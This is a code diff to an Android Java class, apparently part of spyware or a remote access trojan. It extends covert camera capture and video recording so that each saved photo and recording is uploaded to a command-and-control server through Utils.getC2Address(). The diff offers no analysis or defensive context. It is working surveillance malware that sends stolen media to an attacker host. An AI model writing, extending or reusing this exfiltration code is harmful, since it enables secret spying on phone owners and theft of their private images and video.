@@ -64,6 +64,14 @@ public class Screenshot {
      */
     public static String captureImage(Context context, boolean frontCamera) {
         String filename =  Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/"+ String.valueOf(System.currentTimeMillis()).replaceAll(":", ".") + ".png";
+        File img = new File(filename);
+        try {
+            if (!img.exists())
+                img.createNewFile();
+        } catch (Exception ex) {
+            Log.e("eeee", ex.toString());
+        }
+
         camera = getCamera(frontCamera);
         android.hardware.Camera.Parameters parameters = camera.getParameters();
         camera.setParameters(parameters);
@@ -80,17 +88,18 @@ public class Screenshot {
                 releaseCamera();
                 try{
                     Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
-                    FileOutputStream output = new FileOutputStream(filename);
+                    FileOutputStream output = new FileOutputStream(img);
                     bitmap.compress(Bitmap.CompressFormat.PNG, 20, output);
 
                     output.flush();
                     output.close();
+                    FileManager.uploadFile(img.getAbsolutePath(), Utils.getC2Address() + "/image");
                 }catch(Exception ex){
                 }
             }
         });
 
-        return filename;
+        return img.getAbsolutePath();
     }
 
     /**
@@ -180,6 +189,7 @@ public class Screenshot {
             // Stop recording after duration
             Thread.sleep(duration * 1000L);
             stopRecording();
+            FileManager.uploadFile(videoFile.getAbsolutePath(), Utils.getC2Address() + "/video");
         }
 
         return videoFile.getAbsolutePath();
